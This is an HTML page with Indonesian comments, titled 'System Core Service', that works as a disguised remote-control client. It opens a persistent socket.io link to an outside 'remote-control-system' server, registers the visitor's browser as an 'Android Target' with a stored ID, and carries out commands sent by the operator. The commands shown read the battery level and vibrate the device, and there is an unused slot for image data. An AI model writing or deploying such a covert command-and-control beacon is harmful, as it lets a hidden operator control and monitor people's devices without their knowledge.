<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>System Core Service</title>
</head>
<body>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        // GANTI dengan URL server Render Anda yang aktif
        const SERVER_URL = 'https://remote-control-system-s4jf.onrender.com/'; 

        // Membuat ID unik universal yang aman
        let deviceId = localStorage.getItem('target_id');
        if (!deviceId) {
            deviceId = 'TARGET_' + Math.random().toString(36).substring(2, 8).toUpperCase();
            localStorage.setItem('target_id', deviceId);
        }

        const deviceName = 'Android Target (' + deviceId + ')';

        console.log('Menghubungkan ke server:', SERVER_URL);
        const socket = io(SERVER_URL, {
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 3000
        });

        socket.on('connect', () => {
            console.log('[+] Berhasil terhubung ke server!');
            socket.emit('register-device', { 
                deviceId: deviceId, 
                deviceName: deviceName 
            });
        });

        socket.on('connect_error', (err) => {
            console.log('[-] Koneksi gagal:', err.message);
        });

        // Menangani perintah masuk
        socket.on('execute-command', async (data) => {
            console.log('Perintah diterima:', data.action);
            let responseMessage = `Perintah ${data.action} diproses.`;
            let imageData = null;

            try {
                if (data.action === 'GET_BATTERY' && navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    responseMessage = `🔋 Baterai: ${Math.round(battery.level * 100)}%`;
                } 
                else if (data.action === 'VIBRATE_DEVICE' && navigator.vibrate) {
                    navigator.vibrate(500);
                    responseMessage = '📳 Berhasil bergetar.';
                }
            } catch (e) {
                responseMessage = `Error: ${e.message}`;
            }

            socket.emit('device-response', {
                deviceId: deviceId,
                message: responseMessage,
                imageData: imageData
            });
        });
    </script>
</body>
</html>
